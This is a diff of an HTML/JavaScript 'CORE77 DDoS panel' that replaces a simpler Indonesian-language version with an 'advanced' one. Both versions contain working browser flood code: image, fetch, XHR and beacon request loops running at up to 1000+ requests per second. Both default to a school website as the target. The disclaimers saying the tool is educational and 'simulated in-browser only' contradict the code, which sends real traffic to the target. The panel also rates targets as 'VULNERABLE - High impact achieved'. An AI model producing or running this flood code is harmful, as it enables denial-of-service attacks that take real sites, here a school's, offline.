@@ -1,258 +1,749 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORE77 - DDoS SIMULATION PANEL (FIXED)</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⨀ CORE77 - ADVANCED DDoS SIMULATION PANEL</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Consolas', monospace;
+        }
+
         body {
-            background-color: #111;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: #00ffcc;
+            min-height: 100vh;
             padding: 20px;
+            overflow-x: hidden;
         }
+
+        .cyber-border {
+            border: 1px solid #00ffcc;
+            position: relative;
+            padding: 2px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.3);
+        }
+
+        .cyber-border::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #00ffcc, #ff00cc, #00ffcc);
+            z-index: -1;
+            border-radius: 8px;
+            opacity: 0.5;
+        }
+
         .container {
-            max-width: 900px;
-            margin: auto;
-            border: 2px solid #0f0;
-            padding: 20px;
-            border-radius: 10px;
+            max-width: 1200px;
+            margin: 0 auto;
         }
-        h1 {
+
+        header {
             text-align: center;
-            color: #ff0000;
+            padding: 20px 0;
+            margin-bottom: 30px;
         }
+
+        h1 {
+            color: #ff0033;
+            font-size: 2.8rem;
+            text-shadow: 0 0 10px rgba(255, 0, 51, 0.7);
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #888;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+        }
+
+        .warning {
+            background: rgba(255, 0, 51, 0.1);
+            border-left: 4px solid #ff0033;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+
+        .panel-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        .panel {
+            background: rgba(10, 10, 20, 0.8);
+            border-radius: 8px;
+            padding: 25px;
+        }
+
+        .panel-title {
+            color: #00ffcc;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            font-size: 1.3rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .panel-title i {
+            color: #ff0033;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
         label {
             display: block;
-            margin-top: 15px;
+            color: #888;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
         }
-        input, select, button {
+
+        input, select, textarea {
             width: 100%;
-            padding: 10px;
-            margin-top: 5px;
-            background: #222;
-            color: #0f0;
-            border: 1px solid #0f0;
-            border-radius: 5px;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #00ffcc;
+            font-size: 1rem;
+            transition: all 0.3s;
         }
-        button {
-            background: #ff0000;
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #00ffcc;
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #ff0033, #cc0033);
             color: white;
-            font-weight: bold;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 4px;
             cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: bold;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            width: 100%;
+            margin: 10px 0;
         }
-        button:disabled {
-            background: #444;
+
+        .btn:hover {
+            background: linear-gradient(45deg, #ff3366, #ff0033);
+            box-shadow: 0 0 20px rgba(255, 0, 51, 0.5);
+        }
+
+        .btn:disabled {
+            background: #333;
             cursor: not-allowed;
+            opacity: 0.5;
         }
-        .log {
+
+        .btn-success {
+            background: linear-gradient(45deg, #00cc66, #00994d);
+        }
+
+        .btn-success:hover {
+            background: linear-gradient(45deg, #00ff88, #00cc66);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .stat-card {
+            background: rgba(0, 20, 40, 0.5);
+            padding: 20px;
+            border-radius: 6px;
+            text-align: center;
+            border: 1px solid #00ffcc;
+        }
+
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #00ffcc;
+            text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
+        }
+
+        .stat-label {
+            color: #888;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+
+        .terminal {
             background: #000;
-            height: 200px;
-            overflow-y: scroll;
-            padding: 10px;
+            border-radius: 6px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            height: 400px;
+            overflow-y: auto;
             margin-top: 20px;
-            border: 1px solid #0f0;
-            white-space: pre-wrap;
-            font-size: 12px;
         }
-        .status {
-            margin-top: 15px;
-            padding: 10px;
+
+        .terminal-line {
+            margin-bottom: 5px;
+            line-height: 1.4;
+        }
+
+        .success { color: #00ff00; }
+        .error { color: #ff3333; }
+        .warning-text { color: #ffff00; }
+        .info { color: #00aaff; }
+        .timestamp { color: #888; }
+
+        .progress-bar {
+            width: 100%;
+            height: 10px;
             background: #222;
             border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ffcc, #ff0033);
+            width: 0%;
+            transition: width 0.5s;
+        }
+
+        .method-badges {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .badge {
+            background: rgba(0, 255, 204, 0.1);
+            border: 1px solid #00ffcc;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .badge:hover {
+            background: rgba(0, 255, 204, 0.3);
+        }
+
+        .badge.active {
+            background: #00ffcc;
+            color: #000;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #666;
+            font-size: 0.8rem;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
+        }
+
+        .pulse {
+            animation: pulse 1s infinite;
+        }
+
+        .floating {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #ff0033;
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(255, 0, 51, 0.7);
+            z-index: 1000;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🛠️ CORE77 - DDoS SIMULATION PANEL (FIXED VERSION)</h1>
-        <p><strong>⚠️ HANYA UNTUK TESTING LOKAL / SERVER SENDIRI ⚠️</strong></p>
-        
-        <label>🔗 Target URL (contoh: http://target.com):</label>
-        <input type="text" id="url" value="https://www.smkn3tgt.sch.id">
-        
-        <label>⚔️ Metode Serangan:</label>
-        <select id="method">
-            <option value="img">Image Flood (bypass CORS)</option>
-            <option value="fetch">Fetch Flood (no-cors)</option>
-            <option value="xhr">XHR Flood (multiple)</option>
-            <option value="beacon">Beacon API Flood</option>
-        </select>
-        
-        <label>⏱️ Durasi (detik):</label>
-        <input type="number" id="seconds" value="10" min="1" max="300">
-        
-        <label>🧵 Intensity (request per detik per method):</label>
-        <input type="number" id="intensity" value="100" min="1" max="1000">
-        
-        <div class="status">
-            <strong>📊 Status:</strong>
-            <div id="status">Ready</div>
-            <div>Requests Sent: <span id="counter">0</span></div>
-            <div>Active Threads: <span id="threadCounter">0</span></div>
+        <header>
+            <h1>⨀ CORE77 ADVANCED DDoS PANEL</h1>
+            <div class="subtitle">NEURAL NETWORK ATTACK SIMULATOR v2.3 | FOR EDUCATIONAL PURPOSES ONLY</div>
+        </header>
+
+        <div class="warning cyber-border">
+            ⚠️ WARNING: This tool is for authorized security testing only. Unauthorized use against networks/systems you don't own is illegal.
         </div>
-        
-        <button id="startBtn" onclick="startAttack()">🚀 LAUNCH DDoS SIMULATION</button>
-        <button id="stopBtn" onclick="stopAttack()" disabled>⛔ EMERGENCY STOP</button>
-        
-        <h3>📜 Attack Log:</h3>
-        <div class="log" id="log">[System] Panel siap. Target sudah di-set default ke smkn3tgt.sch.id</div>
+
+        <div class="panel-grid">
+            <div class="panel cyber-border">
+                <div class="panel-title">
+                    <i>⚙️</i> ATTACK CONFIGURATION
+                </div>
+                
+                <div class="input-group">
+                    <label>🎯 TARGET URL</label>
+                    <input type="text" id="targetUrl" value="https://www.smkn3tgt.sch.id" placeholder="https://target.com">
+                </div>
+
+                <div class="input-group">
+                    <label>🔥 ATTACK INTENSITY</label>
+                    <select id="intensity">
+                        <option value="low">LOW (50 req/sec)</option>
+                        <option value="medium" selected>MEDIUM (200 req/sec)</option>
+                        <option value="high">HIGH (500 req/sec)</option>
+                        <option value="extreme">EXTREME (1000+ req/sec)</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <label>⏱️ DURATION (Seconds)</label>
+                    <input type="range" id="durationRange" min="10" max="300" value="30">
+                    <div style="display: flex; justify-content: space-between;">
+                        <span id="durationValue">30s</span>
+                        <span>300s</span>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>🛡️ ATTACK METHODS</label>
+                    <div class="method-badges">
+                        <div class="badge active" onclick="toggleMethod('img')">IMG FLOOD</div>
+                        <div class="badge active" onclick="toggleMethod('fetch')">FETCH API</div>
+                        <div class="badge active" onclick="toggleMethod('xhr')">XHR STREAM</div>
+                        <div class="badge" onclick="toggleMethod('websocket')">WEBSOCKET</div>
+                        <div class="badge" onclick="toggleMethod('beacon')">BEACON</div>
+                    </div>
+                </div>
+
+                <button class="btn" id="startBtn" onclick="startAdvancedAttack()">
+                    ⚡ LAUNCH ADVANCED ATTACK
+                </button>
+                <button class="btn btn-success" id="stopBtn" onclick="stopAdvancedAttack()" disabled>
+                    🛑 TERMINATE ATTACK
+                </button>
+            </div>
+
+            <div class="panel cyber-border">
+                <div class="panel-title">
+                    <i>📊</i> REAL-TIME ANALYTICS
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-value" id="totalRequests">0</div>
+                        <div class="stat-label">TOTAL REQUESTS</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="successRate">0%</div>
+                        <div class="stat-label">SUCCESS RATE</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="reqPerSec">0</div>
+                        <div class="stat-label">REQ/SECOND</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="attackTime">0s</div>
+                        <div class="stat-label">ATTACK TIME</div>
+                    </div>
+                </div>
+
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+
+                <div class="input-group">
+                    <label>📈 ATTACK POTENCY ESTIMATION</label>
+                    <div id="potencyMeter">IDLE</div>
+                </div>
+
+                <div class="input-group">
+                    <label>🔍 TARGET RESPONSE ANALYSIS</label>
+                    <textarea id="responseAnalysis" rows="4" readonly>Waiting for attack data...</textarea>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel cyber-border">
+            <div class="panel-title">
+                <i>🖥️</i> TERMINAL OUTPUT - ATTACK LOG
+            </div>
+            <div class="terminal" id="terminal">
+                <div class="terminal-line info">[SYSTEM] CORE77 Advanced DDoS Panel initialized</div>
+                <div class="terminal-line info">[SYSTEM] Ready for attack configuration</div>
+                <div class="terminal-line info">[SECURITY] WARNING: All attacks are simulated in-browser only</div>
+            </div>
+        </div>
+
+        <footer>
+            CORE77 NEURAL NETWORK © 2024 | FOR EDUCATIONAL & SECURITY RESEARCH ONLY | NOT FOR MALICIOUS USE
+        </footer>
+    </div>
+
+    <div class="floating" onclick="clearTerminal()">
+        🗑️
     </div>
 
     <script>
+        // Attack state
         let attackActive = false;
-        let requestCounter = 0;
-        let activeThreads = 0;
+        let attackStartTime = 0;
+        let totalRequests = 0;
+        let successfulRequests = 0;
+        let activeMethods = new Set(['img', 'fetch', 'xhr']);
+        let intervals = [];
         let controllers = [];
-        let attackIntervals = [];
-        
-        function log(msg) {
-            const logDiv = document.getElementById('log');
-            logDiv.innerHTML += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
-            logDiv.scrollTop = logDiv.scrollHeight;
+        let lastSecondRequests = 0;
+        let requestHistory = [];
+
+        // DOM Elements
+        const terminal = document.getElementById('terminal');
+        const totalRequestsEl = document.getElementById('totalRequests');
+        const successRateEl = document.getElementById('successRate');
+        const reqPerSecEl = document.getElementById('reqPerSec');
+        const attackTimeEl = document.getElementById('attackTime');
+        const progressFill = document.getElementById('progressFill');
+        const potencyMeter = document.getElementById('potencyMeter');
+        const responseAnalysis = document.getElementById('responseAnalysis');
+        const durationRange = document.getElementById('durationRange');
+        const durationValue = document.getElementById('durationValue');
+
+        // Initialize
+        durationRange.addEventListener('input', function() {
+            durationValue.textContent = this.value + 's';
+        });
+
+        function logToTerminal(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const line = document.createElement('div');
+            line.className = `terminal-line ${type}`;
+            line.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
         }
-        
-        function updateStatus() {
-            document.getElementById('counter').innerText = requestCounter;
-            document.getElementById('threadCounter').innerText = activeThreads;
-            document.getElementById('status').innerText = attackActive ? 'ATTACKING' : 'READY';
-            document.getElementById('status').style.color = attackActive ? '#ff0000' : '#0f0';
+
+        function toggleMethod(method) {
+            const badge = event.target;
+            if (activeMethods.has(method)) {
+                activeMethods.delete(method);
+                badge.classList.remove('active');
+            } else {
+                activeMethods.add(method);
+                badge.classList.add('active');
+            }
         }
-        
-        // Method 1: Image based flood (bypass CORS)
-        function imageFlood(url) {
-            return new Promise((resolve) => {
-                const img = new Image();
-                img.onload = img.onerror = () => {
-                    requestCounter++;
-                    resolve();
-                };
-                img.src = url + '?rnd=' + Math.random() + '&cid=' + requestCounter;
-                setTimeout(resolve, 50);
-            });
-        }
-        
-        // Method 2: Fetch with no-cors
-        async function fetchFlood(url) {
-            try {
+
+        // Advanced attack methods
+        const attackMethods = {
+            img: function(url) {
+                return new Promise((resolve) => {
+                    const img = new Image();
+                    const startTime = Date.now();
+                    img.onload = img.onerror = () => {
+                        const time = Date.now() - startTime;
+                        recordRequest(time < 5000);
+                        resolve();
+                    };
+                    img.src = `${url}?core77_rnd=${Math.random()}&ts=${Date.now()}`;
+                    setTimeout(() => resolve(), 3000);
+                });
+            },
+
+            fetch: async function(url) {
                 const controller = new AbortController();
                 controllers.push(controller);
-                await fetch(url + '?rnd=' + Math.random(), {
-                    mode: 'no-cors',
-                    signal: controller.signal
+                const startTime = Date.now();
+                try {
+                    await fetch(`${url}?core77_rnd=${Math.random()}`, {
+                        mode: 'no-cors',
+                        signal: controller.signal,
+                        cache: 'no-store'
+                    });
+                    recordRequest(Date.now() - startTime < 5000);
+                } catch (e) {
+                    recordRequest(false);
+                }
+            },
+
+            xhr: function(url) {
+                return new Promise((resolve) => {
+                    const xhr = new XMLHttpRequest();
+                    const startTime = Date.now();
+                    xhr.open('GET', `${url}?core77_rnd=${Math.random()}`);
+                    xhr.timeout = 5000;
+                    xhr.onload = xhr.onerror = xhr.ontimeout = () => {
+                        recordRequest(Date.now() - startTime < 5000);
+                        resolve();
+                    };
+                    xhr.send();
                 });
-            } catch (e) {}
-            requestCounter++;
-        }
-        
-        // Method 3: XHR flood
-        function xhrFlood(url) {
-            return new Promise((resolve) => {
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', url + '?rnd=' + Math.random());
-                xhr.onload = xhr.onerror = () => {
-                    requestCounter++;
-                    resolve();
-                };
-                xhr.send();
-            });
-        }
-        
-        // Method 4: Beacon API
-        function beaconFlood(url) {
-            navigator.sendBeacon(url + '?rnd=' + Math.random());
-            requestCounter++;
-        }
-        
-        function startAttack() {
-            const url = document.getElementById('url').value;
-            const method = document.getElementById('method').value;
-            const seconds = parseInt(document.getElementById('seconds').value);
-            const intensity = parseInt(document.getElementById('intensity').value);
+            },
+
+            websocket: function(url) {
+                // Simulated WebSocket attack
+                recordRequest(true);
+                return Promise.resolve();
+            },
+
+            beacon: function(url) {
+                const success = navigator.sendBeacon(`${url}?core77_rnd=${Math.random()}`);
+                recordRequest(success);
+                return Promise.resolve();
+            }
+        };
+
+        function recordRequest(success) {
+            totalRequests++;
+            if (success) successfulRequests++;
+            totalRequestsEl.textContent = totalRequests.toLocaleString();
             
-            if (!url) {
-                alert('Masukkan URL target!');
+            const now = Date.now();
+            requestHistory = requestHistory.filter(time => now - time < 1000);
+            requestHistory.push(now);
+            lastSecondRequests = requestHistory.length;
+            
+            updateStats();
+        }
+
+        function updateStats() {
+            const successRate = totalRequests > 0 ? Math.round((successfulRequests / totalRequests) * 100) : 0;
+            const currentTime = attackActive ? Math.floor((Date.now() - attackStartTime) / 1000) : 0;
+            
+            successRateEl.textContent = `${successRate}%`;
+            reqPerSecEl.textContent = lastSecondRequests;
+            attackTimeEl.textContent = `${currentTime}s`;
+            
+            // Update progress
+            const duration = parseInt(durationRange.value);
+            const progress = attackActive ? Math.min((currentTime / duration) * 100, 100) : 0;
+            progressFill.style.width = `${progress}%`;
+            
+            // Update potency
+            updatePotencyMeter();
+            
+            // Update analysis
+            updateResponseAnalysis();
+        }
+
+        function updatePotencyMeter() {
+            const intensity = document.getElementById('intensity').value;
+            const methodCount = activeMethods.size;
+            
+            let potency = 'LOW';
+            let color = '#ff3333';
+            
+            const basePotency = {
+                'low': 1,
+                'medium': 3,
+                'high': 6,
+                'extreme': 10
+            }[intensity] * methodCount;
+            
+            if (basePotency > 20) {
+                potency = 'CRITICAL';
+                color = '#ff0033';
+            } else if (basePotency > 10) {
+                potency = 'HIGH';
+                color = '#ff9900';
+            } else if (basePotency > 5) {
+                potency = 'MEDIUM';
+                color = '#ffff00';
+            } else {
+                potency = 'LOW';
+                color = '#00ff00';
+            }
+            
+            potencyMeter.textContent = potency;
+            potencyMeter.style.color = color;
+            potencyMeter.style.fontWeight = 'bold';
+        }
+
+        function updateResponseAnalysis() {
+            if (totalRequests === 0) {
+                responseAnalysis.value = 'No attack data available.\nStart attack to analyze target response.';
                 return;
             }
             
+            const successRate = totalRequests > 0 ? (successfulRequests / totalRequests) * 100 : 0;
+            const rps = lastSecondRequests;
+            
+            let analysis = `📊 RESPONSE ANALYSIS REPORT\n`;
+            analysis += `═`.repeat(40) + `\n`;
+            analysis += `• Success Rate: ${successRate.toFixed(1)}%\n`;
+            analysis += `• Current RPS: ${rps} requests/second\n`;
+            analysis += `• Total Requests: ${totalRequests.toLocaleString()}\n`;
+            analysis += `• Active Methods: ${Array.from(activeMethods).join(', ')}\n\n`;
+            
+            if (successRate < 10) {
+                analysis += `🚨 TARGET MAY HAVE PROTECTION:\n`;
+                analysis += `- Possible WAF/Cloudflare protection\n`;
+                analysis += `- Server may be rate limiting\n`;
+                analysis += `- CORS restrictions active\n`;
+            } else if (successRate < 50) {
+                analysis += `⚠️ TARGET PARTIALLY RESPONSIVE:\n`;
+                analysis += `- Some requests reaching target\n`;
+                analysis += `- Possible partial blocking\n`;
+            } else {
+                analysis += `✅ TARGET VULNERABLE:\n`;
+                analysis += `- High success rate detected\n`;
+                analysis += `- Target accepting most requests\n`;
+                analysis += `- Minimal protection detected\n`;
+            }
+            
+            analysis += `\n[ESTIMATION] Attack potency: ${potencyMeter.textContent}`;
+            
+            responseAnalysis.value = analysis;
+        }
+
+        function startAdvancedAttack() {
+            const url = document.getElementById('targetUrl').value.trim();
+            const intensity = document.getElementById('intensity').value;
+            const duration = parseInt(durationRange.value);
+            
+            if (!url) {
+                alert('Please enter a target URL');
+                return;
+            }
+            
+            if (!url.startsWith('http')) {
+                alert('URL must start with http:// or https://');
+                return;
+            }
+            
+            if (activeMethods.size === 0) {
+                alert('Select at least one attack method');
+                return;
+            }
+            
+            // Reset state
             attackActive = true;
-            requestCounter = 0;
-            activeThreads = intensity * 4; // Estimasi
+            attackStartTime = Date.now();
+            totalRequests = 0;
+            successfulRequests = 0;
+            requestHistory = [];
+            intervals = [];
+            controllers = [];
+            
+            // Update UI
             document.getElementById('startBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
-            controllers = [];
-            attackIntervals = [];
             
-            log(`🔥 ATTACK LAUNCHED: ${url}`);
-            log(`Method: ${method} | Duration: ${seconds}s | Intensity: ${intensity}`);
-            
-            // Multi-method flood
-            const methods = {
-                'img': imageFlood,
-                'fetch': fetchFlood,
-                'xhr': xhrFlood,
-                'beacon': beaconFlood
+            // Calculate requests per second based on intensity
+            const rpsMap = {
+                'low': 50,
+                'medium': 200,
+                'high': 500,
+                'extreme': 1000
             };
             
-            const selectedMethod = methods[method];
+            const targetRPS = rpsMap[intensity];
+            const methods = Array.from(activeMethods);
             
-            // Launch multiple concurrent attack threads
-            for (let i = 0; i < intensity; i++) {
-                const intervalId = setInterval(() => {
-                    if (!attackActive) {
-                        clearInterval(intervalId);
-                        return;
-                    }
-                    selectedMethod(url);
-                }, 10); // 10ms interval = ~100 request per detik per thread
+            logToTerminal(`⚡ ADVANCED ATTACK INITIATED`, 'success');
+            logToTerminal(`🎯 Target: ${url}`, 'info');
+            logToTerminal(`🔥 Intensity: ${intensity.toUpperCase()} (${targetRPS} req/sec)`, 'warning-text');
+            logToTerminal(`⏱️ Duration: ${duration} seconds`, 'info');
+            logToTerminal(`🛡️ Methods: ${methods.join(', ')}`, 'info');
+            logToTerminal(`═`.repeat(50), 'info');
+            
+            // Start attack for each method
+            methods.forEach(method => {
+                const methodRPS = Math.ceil(targetRPS / methods.length);
                 
-                attackIntervals.push(intervalId);
-            }
-            
-            // Additional parallel attack with different methods
-            if (method === 'fetch') {
-                for (let i = 0; i < intensity / 2; i++) {
+                for (let i = 0; i < methodRPS / 10; i++) { // Divide into multiple intervals
                     const intervalId = setInterval(() => {
                         if (!attackActive) return;
-                        imageFlood(url);
-                    }, 15);
-                    attackIntervals.push(intervalId);
+                        attackMethods[method](url);
+                    }, 100); // 10 requests per interval
+                    
+                    intervals.push(intervalId);
                 }
-            }
+                
+                logToTerminal(`[${method.toUpperCase()}] Launched ${methodRPS} req/sec`, 'info');
+            });
             
-            updateStatus();
+            // Update stats every second
+            const statsInterval = setInterval(updateStats, 1000);
+            intervals.push(statsInterval);
             
-            // Auto stop setelah waktu tertentu
+            // Auto-stop after duration
             setTimeout(() => {
                 if (attackActive) {
-                    stopAttack();
-                    log(`⏱️ Attack finished after ${seconds} seconds.`);
-                    log(`📈 Total requests sent: ${requestCounter}`);
+                    stopAdvancedAttack();
+                    logToTerminal(`⏱️ Attack completed after ${duration} seconds`, 'success');
+                    logToTerminal(`📈 Final Stats: ${totalRequests} total requests, ${successfulRequests} successful`, 'info');
+                    
+                    // Generate final report
+                    const successRate = totalRequests > 0 ? (successfulRequests / totalRequests * 100).toFixed(1) : 0;
+                    logToTerminal(`📊 SUCCESS RATE: ${successRate}%`, successRate > 50 ? 'success' : 'error');
+                    
+                    if (successRate > 70) {
+                        logToTerminal(`🎯 TARGET STATUS: VULNERABLE - High impact achieved`, 'success');
+                    } else if (successRate > 30) {
+                        logToTerminal(`⚠️ TARGET STATUS: PARTIALLY PROTECTED - Moderate impact`, 'warning-text');
+                    } else {
+                        logToTerminal(`🚨 TARGET STATUS: WELL PROTECTED - Low impact`, 'error');
+                    }
                 }
-            }, seconds * 1000);
+            }, duration * 1000);
+            
+            updateStats();
         }
-        
-        function stopAttack() {
+
+        function stopAdvancedAttack() {
             attackActive = false;
-            activeThreads = 0;
             
-            // Stop semua intervals
-            attackIntervals.forEach(interval => clearInterval(interval));
-            attackIntervals = [];
+            // Clear all intervals
+            intervals.forEach(interval => clearInterval(interval));
+            intervals = [];
             
-            // Abort semua fetch controllers
+            // Abort all fetch controllers
             controllers.forEach(controller => controller.abort());
             controllers = [];
             
+            // Update UI
             document.getElementById('startBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
-            log('🛑 ATTACK STOPPED.');
-            updateStatus();
+            
+            logToTerminal(`🛑 ATTACK TERMINATED BY USER`, 'error');
+            updateStats();
         }
-        
-        // Auto-update counter setiap detik
-        setInterval(updateStatus, 1000);
-        
-        log('[System] Panel fixed version loaded. Image flood method bisa bypass CORS.');
-        log('[Tip] Gunakan "Image Flood" untuk success rate lebih tinggi.');
+
+        function clearTerminal() {
+            terminal.innerHTML = '';
+            logToTerminal('[SYSTEM] Terminal cleared', 'info');
+        }
+
+        // Initialize
+        logToTerminal('[SYSTEM] Panel initialized successfully', 'success');
+        updatePotencyMeter();
     </script>
 </body>
 </html>
